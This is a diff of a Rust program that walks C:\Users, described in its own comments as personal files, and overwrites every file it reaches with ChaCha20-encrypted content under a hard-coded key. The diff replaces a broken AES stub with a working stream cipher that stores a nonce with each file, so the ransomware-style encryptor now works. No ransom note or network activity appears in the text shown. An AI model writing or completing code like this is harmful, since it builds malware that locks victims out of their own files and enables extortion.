@@ -1,5 +1,6 @@
-use aes::Aes128;
-use aes::cipher::{BlockEncrypt, BlockDecrypt, KeyInit}; // Import traits for encryption and decryption
+use chacha20::ChaCha20;
+use chacha20::cipher::{KeyIvInit, StreamCipher};
+use rand::Rng;
 use std::fs::{self, File};
 use std::io::{self, Read, Write};
 use std::path::Path;
@@ -18,7 +19,7 @@ struct TraversalStats {
 }
 fn main() {
     // Hard-coded encryption key
-    let key = b"thisisasimplekey"; // Use a 16-byte key for AES-128
+    let key = b"thisisasimplekeythisisasimplekey"; // Use a 32-byte key for chacha20
     // Specify the directory you wish to encrypt, e.g., C:\\Users for personal files
     let target_dir = Path::new("C:\\Users");
     let stats = Arc::new(TraversalStats::default());
@@ -132,31 +133,42 @@ fn should_skip_directory(dir: &Path) -> bool {
 }
 // Function to encrypt a single file
 fn encrypt_file(path: &Path, key: &[u8]) -> io::Result<()> {
-    // Read the file contents
+    // Read file contents
     let mut file = File::open(path)?;
     let mut contents = Vec::new();
     file.read_to_end(&mut contents)?;
-    // Encrypt the contents (simple example using AES block encryption)
-    let cipher = Aes128::new_from_slice(key).unwrap(); // Initialize AES cipher
-    let mut buffer = [0u8; 16]; // Buffer for block size (AES block size is 16 bytes)
-    cipher.encrypt_block((&mut buffer).into()); // Encrypt one block (this is a simplification)
-    // Write the encrypted content back to the file (or to a new file)
-    let mut encrypted_file = File::create(path)?;
-    encrypted_file.write_all(&buffer)?;
+    
+    // Generate nonce
+    let mut nonce = [0u8; 12];
+    rand::thread_rng().fill(&mut nonce);
+    
+    // Create cipher and encrypt data in place 
+    let mut cipher = ChaCha20::new(key.into(), &nonce.into());
+    let mut encrypted_data = contents.clone();
+    cipher.apply_keystream(&mut encrypted_data);
+    
+    // Write nonce + encrypted data
+    let mut final_data = Vec::with_capacity(12 + encrypted_data.len());
+    final_data.extend_from_slice(&nonce);
+    final_data.extend_from_slice(&encrypted_data);
+    
+    let mut file = File::create(path)?;
+    file.write_all(&final_data)?;
     Ok(())
-}
-// Function to decrypt a single file
-fn decrypt_file(path: &Path, key: &[u8]) -> io::Result<()> {
-    // Read the encrypted file contents
+ }
+ 
+ fn decrypt_file(path: &Path, key: &[u8]) -> io::Result<()> {
     let mut file = File::open(path)?;
     let mut contents = Vec::new();
     file.read_to_end(&mut contents)?;
-    // Decrypt the contents (simple example using AES block decryption)
-    let cipher = Aes128::new_from_slice(key).unwrap(); // Initialize AES cipher
-    let mut buffer = [0u8; 16]; // Buffer for block size (AES block size is 16 bytes)
-    cipher.decrypt_block((&mut buffer).into()); // Decrypt one block (this is a simplification)
-    // Write the decrypted content back to the file (or to a new file)
-    let mut decrypted_file = File::create(path)?;
-    decrypted_file.write_all(&buffer)?;
+    
+    let nonce = &contents[..12];
+    let mut encrypted_data = contents[12..].to_vec();
+    
+    let mut cipher = ChaCha20::new(key.into(), nonce.into());
+    cipher.apply_keystream(&mut encrypted_data);
+    
+    let mut file = File::create(path)?;
+    file.write_all(&encrypted_data)?;
     Ok(())
-}
+ }
